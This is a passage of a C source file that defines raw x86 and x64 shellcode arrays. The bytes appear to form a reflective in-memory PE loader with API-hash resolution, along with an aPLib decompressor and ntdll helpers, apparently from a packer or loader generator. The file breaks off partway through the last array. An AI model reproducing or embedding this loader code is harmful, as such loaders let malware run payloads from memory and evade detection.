#include "shellcode_data.h"
#include <stdint.h>

char shellcode_main_x86[1354] = {
  "\xe9\x92\x04\x00\x00\x55\x8b\xec\x83\xec\x18\x53\x56\x8b\x71\x3c\x57\x89\x55\xf4\x8b\x44\x0e\x78\x85\xc0\x74\x6d\x83\x7c"
  "\x0e\x7c\x00\x74\x66\x8b\x5c\x08\x18\x89\x5d\xf8\x85\xdb\x74\x5b\x8b\x54\x08\x1c\x8b\x74\x08\x20\x03\xd1\x8b\x44\x08\x24"
  "\x03\xf1\x89\x55\xe8\x03\xc1\x33\xd2\x89\x75\xf0\x89\x45\xec\x85\xdb\x74\x3a\x8b\x3c\x96\x33\xf6\x03\xf9\x89\x7d\xfc\x8a"
  "\x07\x84\xc0\x74\x17\x8b\xdf\x69\xf6\x83\x00\x00\x00\x0f\xbe\xc0\x03\xf0\x43\x8a\x03\x84\xc0\x75\xee\x8b\x5d\xf8\x81\xe6"
  "\xff\xff\xff\x7f\x3b\x75\xf4\x74\x11\x8b\x75\xf0\x42\x3b\xd3\x72\xc6\x33\xc0\x5f\x5e\x5b\x8b\xe5\x5d\xc3\x83\x7d\x08\x00"
  "\x75\x11\x8b\x45\xec\x0f\xb7\x04\x50\x8b\x55\xe8\x8b\x04\x82\x03\xc1\xeb\xe2\x57\x51\xff\x55\x08\xeb\xdb\x55\x8b\xec\x51"
  "\x83\x65\xfc\x00\xe8\x00\x00\x00\x00\x58\x2d\xbd\x10\xba\x00\x89\x45\xfc\x8b\x45\xfc\x8b\xe5\x5d\xc3\x55\x8b\xec\x51\x51"
  "\x64\xa1\x30\x00\x00\x00\x53\x56\x57\x8b\x40\x0c\x8b\xd9\x8b\x50\x14\xeb\x41\x0f\xb7\x72\x24\x33\xc9\x8b\x7a\x28\xd1\xee"
  "\x85\xf6\x7e\x1e\x0f\xb7\x07\x8d\x7f\x02\x83\xf8\x61\x72\x05\x05\xe0\xff\x00\x00\x69\xc9\x83\x00\x00\x00\x0f\xb7\xc0\x03"
  "\xc8\x4e\x75\xe2\x81\xe1\xff\xff\xff\x7f\x81\xf9\xe6\x9c\xca\x1c\x0f\x84\x9f\x00\x00\x00\x8b\x12\x85\xd2\x75\xbb\x33\xf6"
  "\x6a\x00\xba\x54\xb8\xb9\x1a\x8b\xce\xe8\xcb\xfe\xff\xff\x50\xba\x78\x1f\x20\x7f\x89\x03\x8b\xce\xe8\xbc\xfe\xff\xff\xff"
  "\x33\xba\x62\x34\x89\x5e\x89\x43\x04\x8b\xce\xe8\xab\xfe\xff\xff\xff\x33\xba\x73\x80\x48\x06\x89\x43\x08\x8b\xce\xe8\x9a"
  "\xfe\xff\xff\xff\x33\xba\xa5\xf2\x5c\x70\x89\x43\x0c\x8b\xce\xe8\x89\xfe\xff\xff\x83\xc4\x14\x89\x43\x10\x8d\x45\xf8\xc7"
  "\x45\xf8\x6e\x74\x64\x6c\x66\xc7\x45\xfc\x6c\x00\x50\xff\x53\x04\xff\x33\x8b\xf0\xba\xcb\x79\xb5\x0d\x8b\xce\xe8\x5f\xfe"
  "\xff\xff\xff\x33\xba\xc0\xe9\x18\x15\x89\x43\x14\x8b\xce\xe8\x4e\xfe\xff\xff\x59\x59\x5f\x5e\x89\x43\x18\x5b\x8b\xe5\x5d"
  "\xc3\x8b\x72\x10\xe9\x61\xff\xff\xff\x55\x8b\xec\x83\xec\x18\x8b\xc2\x89\x4d\xfc\x89\x45\xf4\x53\x56\x85\xc0\x75\x07\x33"
  "\xc0\xe9\x92\x02\x00\x00\xba\x4d\x5a\x00\x00\x66\x39\x10\x75\xef\x57\x8b\x78\x3c\x03\xf8\x81\x3f\x50\x45\x00\x00\x0f\x85"
  "\x73\x02\x00\x00\xb8\x4c\x01\x00\x00\x66\x39\x47\x04\x0f\x85\x64\x02\x00\x00\x83\xc0\xbf\x66\x39\x47\x18\x0f\x85\x57\x02"
  "\x00\x00\x6a\x40\x68\x00\x10\x00\x00\xff\x77\x50\x33\xdb\x53\xff\x51\x08\x8b\xf0\x85\xf6\x0f\x84\x3d\x02\x00\x00\xff\x77"
  "\x54\x8b\x45\xfc\xff\x75\xf4\x56\xff\x50\x18\x8b\x7e\x3c\x33\xc0\x03\xfe\x89\x5d\xf0\x89\x7d\xec\x66\x3b\x47\x06\x73\x58"
  "\x8b\x5d\xf4\x8d\x87\x08\x01\x00\x00\x89\x45\xf8\x8b\x48\xfc\x85\xc9\x74\x2b\x03\xce\x83\x38\x00\x74\x11\xff\x30\x8b\x40"
  "\x04\x03\xc3\x50\x8b\x45\xfc\x51\xff\x50\x18\xeb\x10\x83\x7f\x38\x00\x76\x0d\xff\x77\x38\x8b\x45\xfc\x51\xff\x50\x14\x8b"
  "\x45\xf8\x8b\x4d\xf0\x83\xc0\x28\x89\x45\xf8\x41\x0f\xb7\x47\x06\x3b\xc8\x89\x4d\xf0\x8b\x45\xf8\x7c\xb6\x33\xdb\x8b\x87"
  "\xa0\x00\x00\x00\x85\xc0\x74\x60\x39\x9f\xa4\x00\x00\x00\x74\x58\x8d\x0c\x30\xeb\x45\x8d\x42\xf8\x89\x5d\xf4\xd1\xe8\x89"
  "\x45\xf8\x85\xc0\x7e\x31\x0f\xb7\x54\x59\x08\x8b\xc2\xc7\x45\xf4\x00\x30\x00\x00\x25\x00\xf0\x00\x00\x66\x3b\x45\xf4\x75"
  "\x10\x81\xe2\xff\x0f\x00\x00\x8b\xc6\x03\x11\x2b\x47\x34\x01\x04\x32\x43\x3b\x5d\xf8\x7c\xd1\x33\xdb\x8b\x45\xf0\x03\x08"
  "\x8d\x41\x04\x8b\x10\x89\x45\xf0\x8b\x01\x03\xc2\x75\xad\x8b\x87\x80\x00\x00\x00\x85\xc0\x74\x7f\x39\x9f\x84\x00\x00\x00"
  "\x74\x77\x03\xc6\xeb\x69\x03\xc6\x50\x8b\x45\xfc\xff\x50\x04\x89\x45\xe8\x85\xc0\x0f\x84\x22\x01\x00\x00\x8b\x45\xf8\x8b"
  "\x08\x85\xc9\x75\x03\x8b\x48\x10\x8b\x50\x10\x03\xce\x89\x4d\xf0\x03\xd6\x89\x55\xf4\x8b\x09\x85\xc9\x74\x33\x8b\x5d\xfc"
  "\x8b\xfa\x79\x05\x0f\xb7\xc1\xeb\x05\x8d\x46\x02\x03\xc1\x50\xff\x75\xe8\xff\x13\x89\x07\x83\xc7\x04\x8b\x45\xf0\x83\xc0"
  "\x04\x89\x45\xf0\x8b\x08\x85\xc9\x75\xda\x8b\x7d\xec\x33\xdb\x8b\x45\xf8\x83\xc0\x14\x89\x45\xf8\x8b\x40\x0c\x85\xc0\x75"
  "\x8d\x8b\x8f\xc0\x00\x00\x00\x85\xc9\x74\x3f\x8b\x4c\x31\x0c\x33\xd2\x6a\x03\x58\x2b\xc1\x89\x4d\xf0\xc1\xe8\x02\x85\xc9"
  "\x89\x5d\xf4\x0f\x45\xc2\x89\x45\xe8\x85\xc0\x74\x1f\x8b\xf8\x53\x6a\x01\x56\xff\x11\x8b\x4d\xf0\x8b\x45\xf4\x83\xc1\x04"
  "\x40\x89\x4d\xf0\x89\x45\xf4\x3b\xc7\x75\xe6\x8b\x7d\xec\x8b\x47\x28\x03\xc6\x74\x08\xff\x75\x08\x6a\x01\x56\xff\xd0\x83"
  "\x7d\x0c\x00\x0f\x84\x8d\x00\x00\x00\x8b\x45\x10\x85\xc0\x0f\x84\x82\x00\x00\x00\x89\x18\x8b\x47\x78\x85\xc0\x74\x79\x39"
  "\x5f\x7c\x74\x74\x39\x5c\x30\x18\x74\x6e\x8b\x4c\x30\x1c\x8b\x54\x30\x20\x03\xce\x89\x4d\xf4\x03\xd6\x8b\x4c\x30\x24\x03"
  "\xce\x89\x55\xec\x89\x4d\xf0\x39\x5c\x30\x14\x76\x4d\x8b\xf8\x8b\x04\x9a\xff\x75\x0c\x03\xc6\x50\x8b\x45\xfc\xff\x50\x10"
  "\x85\xc0\x74\x24\x8b\x55\xec\x43\x3b\x5c\x37\x14\x72\xe3\xeb\x2c\x8b\x45\xfc\x68\x00\x40\x00\x00\xff\x77\x50\x56\xff\x50"
  "\x0c\x33\xc0\x5f\x5e\x5b\x8b\xe5\x5d\xc3\x8b\x45\xf0\x8b\x4d\xf4\x0f\xb7\x04\x58\x8b\x04\x81\x8b\x4d\x10\x03\xc6\x89\x01"
  "\x33\xc0\x40\xeb\xe0\x55\x8b\xec\x83\xec\x24\x53\x56\x57\x8d\x4d\xdc\xe8\x25\xfc\xff\xff\xe8\x03\xfc\xff\xff\x83\x65\xfc"
  "\x00\x8b\xf0\x81\xc6\x4a\x15\xba\x00\x33\xdb\x8b\x7e\x0d\x8b\x46\x01\x03\xfe\x85\xc0\x74\x3a\x6a\x04\x68\x00\x10\x00\x00"
  "\xff\x76\x05\x03\xc6\x53\x89\x45\xf8\xff\x55\xe4\x8b\xd8\x85\xdb\x75\x04\x33\xc0\xeb\x5f\xff\x76\x05\x53\xff\x76\x09\x57"
  "\xff\x55\xf8\x83\xc4\x10\x83\xf8\xff\x74\x20\x3b\x46\x05\x75\x1b\x8b\xfb\x33\xdb\x43\x80\x3e\x00\x8d\x45\xfc\x50\x8b\xd7"
  "\x8d\x4d\xdc\x8d\x46\x11\x75\x13\x6a\x00\x50\xeb\x11\x68\x00\x40\x00\x00\xff\x76\x05\x53\xff\x55\xe8\xeb\xbb\x50\x6a\x00"
  "\xe8\x9e\xfc\xff\xff\x83\xc4\x0c\x85\xdb\x74\x0c\x68\x00\x40\x00\x00\xff\x76\x05\x57\xff\x55\xe8\x8b\x45\xfc\x5f\x5e\x5b"
  "\x8b\xe5\x5d\xc3"
};

char shellcode_main_x64[1628] = {
  "\xe9\x43\x04\x00\x00\xcc\xcc\xcc\x48\x8b\xc4\x48\x89\x58\x08\x48\x89\x68\x10\x48\x89\x70\x18\x48\x89\x78\x20\x41\x56\x48"
  "\x83\xec\x20\x48\x63\x41\x3c\x4c\x8b\xc9\x49\x8b\xd8\x8b\x8c\x08\x88\x00\x00\x00\x8b\xea\x85\xc9\x74\x6a\x42\x83\xbc\x08"
  "\x8c\x00\x00\x00\x00\x74\x5f\x49\x8d\x04\x09\x44\x8b\x58\x18\x45\x85\xdb\x74\x52\x44\x8b\x40\x20\x8b\x78\x1c\x8b\x70\x24"
  "\x4d\x03\xc1\x49\x03\xf9\x49\x03\xf1\x33\xd2\x45\x85\xdb\x74\x38\x45\x8b\x10\x4d\x03\xd1\x33\xc9\x41\x8a\x02\x4d\x8b\xf2"
  "\xeb\x11\x69\xc9\x83\x00\x00\x00\x0f\xbe\xc0\x03\xc8\x49\xff\xc6\x41\x8a\x06\x84\xc0\x75\xeb\x0f\xba\xf1\x1f\x3b\xcd\x74"
  "\x28\xff\xc2\x49\x83\xc0\x04\x41\x3b\xd3\x72\xc8\x33\xc0\x48\x8b\x5c\x24\x30\x48\x8b\x6c\x24\x38\x48\x8b\x74\x24\x40\x48"
  "\x8b\x7c\x24\x48\x48\x83\xc4\x20\x41\x5e\xc3\x48\x85\xdb\x75\x0c\x0f\xb7\x0c\x56\x8b\x04\x8f\x49\x03\xc1\xeb\xd4\x49\x8b"
  "\xd2\x49\x8b\xc9\xff\xd3\xeb\xca\xcc\xcc\x48\x8b\xc4\x48\x89\x58\x08\x48\x89\x68\x10\x48\x89\x70\x18\x4c\x89\x48\x20\x57"
  "\x41\x54\x41\x55\x41\x56\x41\x57\x48\x83\xec\x20\xb8\x4d\x5a\x00\x00\x4d\x8b\xf9\x4d\x8b\xe0\x48\x8b\xf2\x4c\x8b\xe9\x66"
  "\x39\x02\x0f\x85\xfa\x02\x00\x00\x48\x63\x7a\x3c\x48\x03\xfa\x81\x3f\x50\x45\x00\x00\x0f\x85\xe7\x02\x00\x00\xb8\x64\x86"
  "\x00\x00\x66\x39\x47\x04\x0f\x85\xd8\x02\x00\x00\xb8\x0b\x02\x00\x00\x66\x39\x47\x18\x0f\x85\xc9\x02\x00\x00\x8b\x57\x50"
  "\x33\xc9\x41\xb8\x00\x10\x00\x00\x44\x8d\x49\x40\x41\xff\x55\x10\x48\x8b\xd8\x33\xc0\x48\x85\xdb\x0f\x84\xaa\x02\x00\x00"
  "\x44\x8b\x47\x54\x48\x8b\xd6\x48\x8b\xcb\x41\xff\x55\x30\x48\x63\x7b\x3c\x45\x33\xdb\x48\x03\xfb\x41\x8b\xeb\x66\x44\x3b"
  "\x5f\x06\x73\x47\x4c\x8d\xb7\x18\x01\x00\x00\x45\x39\x5e\xfc\x74\x2c\x41\x8b\x4e\xfc\x48\x03\xcb\x45\x39\x1e\x74\x10\x41"
  "\x8b\x56\x04\x45\x8b\x06\x48\x03\xd6\x41\xff\x55\x30\xeb\x0d\x44\x39\x5f\x38\x76\x0a\x8b\x57\x38\x41\xff\x55\x28\x45\x33"
  "\xdb\x0f\xb7\x47\x06\xff\xc5\x49\x83\xc6\x28\x3b\xe8\x7c\xc0\x8b\x87\xb0\x00\x00\x00\x85\xc0\x0f\x84\xb2\x00\x00\x00\x44"
  "\x39\x9f\xb4\x00\x00\x00\x0f\x84\xa5\x00\x00\x00\x48\x8d\x14\x03\x44\x8b\x4a\x04\x8b\x0a\x41\x03\xc9\x0f\x84\x92\x00\x00"
  "\x00\xbe\x00\xf0\x00\x00\xbd\xff\x0f\x00\x00\x41\x8b\xc1\x4d\x8b\xc3\x48\x83\xe8\x08\x48\xd1\xe8\x4c\x63\xd0\x85\xc0\x7e"
  "\x5f\x46\x0f\xb7\x4c\x42\x08\xb9\x00\x30\x00\x00\x41\x0f\xb7\xc1\x66\x23\xc6\x66\x3b\xc1\x75\x13\x8b\x0a\x4c\x23\xcd\x4a"
  "\x8d\x04\x0b\x48\x03\xc8\x8b\xc3\x2b\x47\x30\x01\x01\x46\x0f\xb7\x4c\x42\x08\xb9\x00\xa0\x00\x00\x41\x0f\xb7\xc1\x66\x23"
  "\xc6\x66\x3b\xc1\x75\x16\x8b\x0a\x4c\x23\xcd\x4a\x8d\x04\x0b\x48\x03\xc8\x48\x8b\xc3\x48\x2b\x47\x30\x48\x01\x01\x49\xff"
  "\xc0\x4d\x3b\xc2\x7c\xa1\x8b\x42\x04\x48\x03\xd0\x44\x8b\x4a\x04\x8b\x0a\x41\x03\xc9\x0f\x85\x78\xff\xff\xff\x8b\x87\x90"
  "\x00\x00\x00\x85\xc0\x0f\x84\x90\x00\x00\x00\x44\x39\x9f\x94\x00\x00\x00\x0f\x84\x83\x00\x00\x00\x48\x8d\x34\x03\x8b\x46"
  "\x0c\x85\xc0\x74\x78\x8b\xc8\x48\x03\xcb\x41\xff\x55\x08\x45\x33\xdb\x48\x8b\xe8\x48\x85\xc0\x0f\x84\x31\x01\x00\x00\x8b"
  "\x0e\x85\xc9\x75\x03\x8b\x4e\x10\x44\x8b\x7e\x10\x44\x8b\xf1\x4c\x03\xf3\x4c\x03\xfb\xeb\x30\x48\xb9\x00\x00\x00\x00\x00"
  "\x00\x00\x80\x48\x85\xc1\x74\x05\x0f\xb7\xd0\xeb\x07\x48\x8d\x53\x02\x48\x03\xd0\x48\x8b\xcd\x41\xff\x55\x00\x49\x83\xc6"
  "\x08\x49\x89\x07\x49\x83\xc7\x08\x45\x33\xdb\x49\x8b\x06\x48\x85\xc0\x75\xc8\x8b\x46\x20\x48\x83\xc6\x14\x85\xc0\x75\x8d"
  "\x4c\x8b\x7c\x24\x68\x8b\x87\xd0\x00\x00\x00\x85\xc0\x74\x39\x48\x8b\x6c\x18\x18\xbe\x07\x00\x00\x00\x4d\x8b\xf3\x48\x2b"
  "\xf5\x48\xc1\xee\x03\x48\x85\xed\x49\x0f\x45\xf3\x48\x85\xf6\x74\x19\x45\x33\xc0\x48\x8b\xcb\x41\x8d\x50\x01\xff\x55\x00"
  "\x49\xff\xc6\x48\x8d\x6d\x08\x4c\x3b\xf6\x75\xe7\x8b\x47\x28\x48\x03\xc3\x74\x0d\x4d\x8b\xc4\xba\x01\x00\x00\x00\x48\x8b"
  "\xcb\xff\xd0\x33\xc0\x4d\x85\xff\x0f\x84\xae\x00\x00\x00\x4c\x8b\x74\x24\x70\x4d\x85\xf6\x0f\x84\xa0\x00\x00\x00\x8b\x8f"
  "\x88\x00\x00\x00\x49\x89\x06\x85\xc9\x0f\x84\x8f\x00\x00\x00\x39\x87\x8c\x00\x00\x00\x0f\x84\x83\x00\x00\x00\x48\x8d\x3c"
  "\x0b\x39\x47\x18\x74\x7a\x44\x8b\x67\x20\x8b\x6f\x1c\x44\x8b\x7f\x24\x4c\x03\xe3\x48\x03\xeb\x4c\x03\xfb\x8b\xf0\x39\x47"
  "\x14\x76\x5f\x48\x8b\x54\x24\x68\x8b\xc6\x41\x8b\x0c\x84\x48\x03\xcb\x41\xff\x55\x20\x85\xc0\x74\x38\xff\xc6\x3b\x77\x14"
  "\x72\xe3\xeb\x40\x8b\x57\x50\x41\xb8\x00\x40\x00\x00\x48\x8b\xcb\x41\xff\x55\x18\x33\xc0\x48\x8b\x5c\x24\x50\x48\x8b\x6c"
  "\x24\x58\x48\x8b\x74\x24\x60\x48\x83\xc4\x20\x41\x5f\x41\x5e\x41\x5d\x41\x5c\x5f\xc3\x8b\xc6\x41\x0f\xb7\x0c\x47\x8b\x44"
  "\x8d\x00\x48\x03\xc3\x49\x89\x06\xb8\x01\x00\x00\x00\xeb\xcb\xcc\x48\x89\x5c\x24\x18\x48\x89\x74\x24\x20\x55\x57\x41\x54"
  "\x41\x56\x41\x57\x48\x8b\xec\x48\x83\xec\x70\x65\x48\x8b\x04\x25\x60\x00\x00\x00\x48\x8b\x48\x18\x48\x8b\x51\x20\xeb\x4e"
  "\x0f\xb7\x42\x48\x4c\x8b\x42\x50\x33\xc9\xd1\xe8\x85\xc0\x7e\x2b\x44\x8b\xc8\x41\x0f\xb7\x00\x4d\x8d\x40\x02\x66\x83\xf8"
  "\x61\x72\x0a\x41\xba\xe0\xff\x00\x00\x66\x41\x03\xc2\x69\xc9\x83\x00\x00\x00\x0f\xb7\xc0\x03\xc8\x49\xff\xc9\x75\xd8\x0f"
  "\xba\xf1\x1f\x81\xf9\xe6\x9c\xca\x1c\x0f\x84\xf9\x00\x00\x00\x48\x8b\x12\x48\x85\xd2\x75\xad\x33\xf6\x45\x33\xc0\xba\x54"
  "\xb8\xb9\x1a\x48\x8b\xce\xe8\x2f\xfb\xff\xff\xba\x78\x1f\x20\x7f\x48\x8b\xce\x4c\x8b\xc0\x48\x8b\xf8\x48\x89\x45\xc0\xe8"
  "\x18\xfb\xff\xff\x4c\x8b\xc7\xba\x62\x34\x89\x5e\x48\x8b\xce\x48\x8b\xd8\x48\x89\x45\xc8\xe8\x01\xfb\xff\xff\x4c\x8b\xc7"
  "\xba\x73\x80\x48\x06\x48\x8b\xce\x4c\x8b\xf0\x48\x89\x45\xd0\xe8\xea\xfa\xff\xff\x4c\x8b\xc7\xba\xa5\xf2\x5c\x70\x48\x8b"
  "\xce\x4c\x8b\xf8\x48\x89\x45\xd8\xe8\xd3\xfa\xff\xff\x48\x8d\x4d\x30\xc7\x45\x30\x6e\x74\x64\x6c\x48\x89\x45\xe0\x66\xc7"
  "\x45\x34\x6c\x00\xff\xd3\x4c\x8b\xc7\xba\xcb\x79\xb5\x0d\x48\x8b\xc8\x48\x8b\xd8\xe8\xa9\xfa\xff\xff\x4c\x8b\xc7\xba\xc0"
  "\xe9\x18\x15\x48\x8b\xcb\x48\x89\x45\xe8\xe8\x95\xfa\xff\xff\x48\x83\x65\x38\x00\x48\x8d\x1d\xdd\x00\x00\x00\x8b\x7b\x0d"
  "\x33\xf6\x48\x89\x45\xf0\x48\x03\xfb\x39\x73\x01\x74\x53\x44\x8b\x63\x01\x8b\x53\x05\x44\x8d\x4e\x04\x33\xc9\x41\xb8\x00"
  "\x10\x00\x00\x4c\x03\xe3\x41\xff\xd6\x4c\x8b\xf0\x48\x85\xc0\x75\x10\x33\xc0\xe9\x8b\x00\x00\x00\x48\x8b\x72\x20\xe9\x08"
  "\xff\xff\xff\x44\x8b\x4b\x05\x8b\x53\x09\x4c\x8b\xc0\x48\x8b\xcf\x41\xff\xd4\x83\xf8\xff\x74\x20\x3b\x43\x05\x75\x1b\x49"
  "\x8b\xfe\xbe\x01\x00\x00\x00\x80\x3b\x00\x75\x1f\x48\x85\xff\x74\x3f\x4c\x8d\x43\x11\x45\x33\xc9\xeb\x1d\x8b\x53\x05\x41"
  "\xb8\x00\x40\x00\x00\x49\x8b\xce\x41\xff\xd7\xeb\xaa\x48\x85\xff\x74\x20\x4c\x8d\x4b\x11\x45\x33\xc0\x48\x8d\x45\x38\x48"
  "\x8d\x4d\xc0\x48\x8b\xd7\x48\x89\x44\x24\x20\xe8\xb4\xfa\xff\xff\x4c\x8b\x7d\xd8\x85\xf6\x74\x0f\x8b\x53\x05\x41\xb8\x00"
  "\x40\x00\x00\x48\x8b\xcf\x41\xff\xd7\x48\x8b\x45\x38\x4c\x8d\x5c\x24\x70\x49\x8b\x5b\x40\x49\x8b\x73\x48\x49\x8b\xe3\x41"
  "\x5f\x41\x5e\x41\x5c\x5f\x5d\xc3"
};

char shellcode_aplib_x86[504] = {
  "\x55\x8b\xec\x51\xff\x75\x10\x8b\x4d\x08\xe8\x5b\x00\x00\x00\x59\x59\x5d\xc3\x56\x8b\xf1\x8b\x56\x0c\x8d\x42\xff\x89\x46"
  "\x0c\x85\xd2\x75\x14\x8b\x16\xc7\x46\x0c\x07\x00\x00\x00\x0f\xb6\x02\x89\x46\x08\x8d\x42\x01\x89\x06\x8b\x4e\x08\x8b\xc1"
  "\x03\xc9\xc1\xe8\x07\x89\x4e\x08\x83\xe0\x01\x5e\xc3\x56\x33\xf6\x57\x8b\xf9\x46\x8b\xcf\xe8\xbc\xff\xff\xff\x8b\xcf\x8d"
  "\x34\x70\xe8\xb2\xff\xff\xff\x85\xc0\x75\xeb\x5f\x8b\xc6\x5e\xc3\x55\x8b\xec\x83\xe4\xf8\x83\xec\x14\x8b\x55\x08\x8a\x01"
  "\x83\x64\x24\x10\x00\x53\x56\x88\x02\x83\xce\xff\x8d\x42\x01\x57\x33\xff\x89\x44\x24\x14\x33\xdb\x8d\x41\x01\x89\x5c\x24"
  "\x0c\x89\x44\x24\x10\x8d\x4c\x24\x10\xe8\x6f\xff\xff\xff\x85\xc0\x0f\x84\x20\x01\x00\x00\x8d\x4c\x24\x10\xe8\x5e\xff\xff"
  "\xff\x8d\x4c\x24\x10\x85\xc0\x74\x7e\xe8\x51\xff\xff\xff\x85\xc0\x74\x33\x6a\x04\x33\xff\x5b\x8d\x4c\x24\x10\xe8\x3f\xff"
  "\xff\xff\x8d\x3c\x78\x4b\x75\xf1\x8b\x54\x24\x14\x85\xff\x74\x0a\x8b\xc2\x2b\xc7\x8a\x00\x88\x02\xeb\x03\xc6\x02\x00\x8b"
  "\x5c\x24\x0c\x42\xe9\xe5\x00\x00\x00\x8b\x44\x24\x10\x8b\x54\x24\x14\x0f\xb6\x30\x40\x8b\xce\x89\x44\x24\x10\x83\xe1\x01"
  "\x83\xc1\x02\xd1\xee\x74\x1a\x85\xc9\x0f\x84\xaa\x00\x00\x00\x8b\xfa\x2b\xfe\x8a\x07\x88\x02\x42\x47\x49\x75\xf7\xe9\x94"
  "\x00\x00\x00\x33\xdb\x43\x89\x5c\x24\x0c\xe9\x8c\x00\x00\x00\xe8\x09\xff\xff\xff\x85\xff\x75\x2c\x83\xf8\x02\x75\x22\x8d"
  "\x4c\x24\x10\xe8\xf7\xfe\xff\xff\x8b\x54\x24\x14\x8b\xf8\x85\xff\x74\x6b\x8b\xca\x2b\xce\x8a\x01\x88\x02\x42\x41\x4f\x75"
  "\xf7\xeb\x58\x83\xe8\x03\xeb\x03\x83\xe8\x02\x8b\x4c\x24\x10\x8b\xf0\xc1\xe6\x08\x0f\xb6\x01\x03\xf0\x41\x89\x4c\x24\x10"
  "\x8d\x4c\x24\x10\xe8\xba\xfe\xff\xff\x8b\xc8\x81\xfe\x00\x7d\x00\x00\x72\x01\x41\x81\xfe\x00\x05\x00\x00\x72\x01\x41\x81"
  "\xfe\x80\x00\x00\x00\x73\x03\x83\xc1\x02\x8b\x54\x24\x14\x85\xc9\x74\x11\x8b\xfa\x2b\xfe\x8a\x07\x88\x02\x42\x47\x49\x75"
  "\xf7\x89\x54\x24\x14\x33\xff\x47\xeb\x18\x8b\x4c\x24\x10\x8b\x54\x24\x14\x8a\x01\x88\x02\x42\x41\x89\x4c\x24\x10\x33\xff"
  "\x89\x54\x24\x14\x85\xdb\x0f\x84\xaf\xfe\xff\xff\x2b\x55\x08\x5f\x5e\x8b\xc2\x5b\x8b\xe5\x5d\xc3"
};

char shellcode_aplib_x64[632] = {
  "\xe9\x3f\x00\x00\x00\xcc\xcc\xcc\x8b\x51\x14\x4c\x8b\xc1\x8d\x42\xff\x89\x41\x14\x85\xd2\x75\x17\x48\x8b\x11\xc7\x41\x14"
  "\x07\x00\x00\x00\x0f\xb6\x02\x89\x41\x10\x48\x8d\x42\x01\x48\x89\x01\x8b\x49\x10\x8b\xc1\x03\xc9\xc1\xe8\x07\x41\x89\x48"
  "\x10\x83\xe0\x01\xc3\xcc\xcc\xcc\x48\x8b\xc4\x48\x89\x58\x08\x48\x89\x70\x10\x48\x89\x78\x18\x4c\x89\x70\x20\x55\x48\x8b"
  "\xec\x48\x83\xec\x40\x8a\x01\x83\x65\xf4\x00\x41\x83\xce\xff\x41\x88\x00\x49\x8d\x40\x01\x45\x33\xdb\x48\x89\x45\xe8\x48"
  "\x8d\x41\x01\x33\xff\x49\x8b\xd8\x45\x8b\xd6\x48\x89\x45\xe0\x8d\x77\x01\x48\x8d\x4d\xe0\xe8\x75\xff\xff\xff\x85\xc0\x0f"
  "\x84\x96\x01\x00\x00\x48\x8d\x4d\xe0\xe8\x64\xff\xff\xff\x85\xc0\x0f\x84\x94\x00\x00\x00\x48\x8d\x4d\xe0\xe8\x53\xff\xff"
  "\xff\x85\xc0\x74\x3e\x45\x33\xc9\x45\x8d\x59\x04\x48\x8d\x4d\xe0\xe8\x3f\xff\xff\xff\x46\x8d\x0c\x48\x44\x2b\xde\x75\xee"
  "\x4c\x8b\x45\xe8\x45\x85\xc9\x74\x13\x41\x8b\xc9\x49\x8b\xc0\x48\x2b\xc1\x8a\x00\x41\x88\x00\xe9\x57\x01\x00\x00\x41\xc6"
  "\x00\x00\xe9\x4e\x01\x00\x00\x48\x8b\x45\xe0\x4c\x8b\x45\xe8\x44\x0f\xb6\x10\x48\x03\xc6\x41\x8b\xca\x48\x89\x45\xe0\x23"
  "\xce\x83\xc1\x02\x41\xd1\xea\x74\x22\x85\xc9\x0f\x84\x0d\x01\x00\x00\x41\x8b\xd2\x48\xf7\xda\x42\x8a\x04\x02\x41\x88\x00"
  "\x4c\x03\xc6\x41\x03\xce\x75\xf1\xe9\xef\x00\x00\x00\x8b\xfe\xe9\xec\x00\x00\x00\x44\x8b\xce\x48\x8d\x4d\xe0\xe8\xbc\xfe"
  "\xff\xff\x48\x8d\x4d\xe0\x46\x8d\x0c\x48\xe8\xaf\xfe\xff\xff\x85\xc0\x75\xe6\x45\x85\xdb\x75\x4d\x41\x83\xf9\x02\x75\x41"
  "\x44\x8b\xce\x48\x8d\x4d\xe0\xe8\x94\xfe\xff\xff\x48\x8d\x4d\xe0\x46\x8d\x0c\x48\xe8\x87\xfe\xff\xff\x85\xc0\x75\xe6\x4c"
  "\x8b\x45\xe8\x45\x85\xc9\x0f\x84\x9a\x00\x00\x00\x41\x8b\xca\x48\xf7\xd9\x42\x8a\x04\x01\x41\x88\x00\x4c\x03\xc6\x45\x03"
  "\xce\x75\xf1\xeb\x7f\x45\x8d\x51\xfd\xeb\x04\x45\x8d\x51\xfe\x48\x8b\x4d\xe0\x41\xc1\xe2\x08\x44\x8b\xce\x0f\xb6\x01\x44"
  "\x03\xd0\x48\x03\xce\x48\x89\x4d\xe0\x48\x8d\x4d\xe0\xe8\x34\xfe\xff\xff\x48\x8d\x4d\xe0\x46\x8d\x0c\x48\xe8\x27\xfe\xff"
  "\xff\x85\xc0\x75\xe6\x41\x81\xfa\x00\x7d\x00\x00\x72\x03\x41\xff\xc1\x41\x81\xfa\x00\x05\x00\x00\x72\x03\x44\x03\xce\x41"
  "\x81\xfa\x80\x00\x00\x00\x73\x04\x41\x83\xc1\x02\x4c\x8b\x45\xe8\x45\x85\xc9\x74\x19\x41\x8b\xca\x48\xf7\xd9\x42\x8a\x04"
  "\x01\x41\x88\x00\x4c\x03\xc6\x45\x03\xce\x75\xf1\x4c\x89\x45\xe8\x44\x8b\xde\xeb\x1e\x48\x8b\x55\xe0\x4c\x8b\x45\xe8\x8a"
  "\x0a\x48\x03\xd6\x41\x88\x08\x48\x89\x55\xe0\x4c\x03\xc6\x45\x33\xdb\x4c\x89\x45\xe8\x85\xff\x0f\x84\x33\xfe\xff\xff\x48"
  "\x8b\x74\x24\x58\x48\x8b\x7c\x24\x60\x4c\x8b\x74\x24\x68\x4c\x2b\xc3\x48\x8b\x5c\x24\x50\x41\x8b\xc0\x48\x83\xc4\x40\x5d"
  "\xc3\xcc"
};

char shellcode_ntdll_x86[404] = {
  "\x55\x8b\xec\x83\xec\x10\x56\x8d\x4d\xf0\xe8\x2c\x00\x00\x00\x8b\x75\x14\x8d\x45\xfc\x50\xff\x75\x0c\xff\x75\x08\x56\xff"
  "\x75\x10\x68\x02\x01\x00\x00\xff\x55\xf8\x85\xc0\x78\x05\x39\x75\xfc\x74\x03\x83\xce\xff\x8b\xc6\x5e\x8b\xe5\x5d\xc3\x55"
  "\x8b\xec\x51\x51\x64\xa1\x30\x00\x00\x00\x53\x56\x57\x8b\x40\x0c\x8b\xd9\x8b\x50\x14\xeb\x3d\x0f\xb7\x72\x24\x33\xc9\x8b"
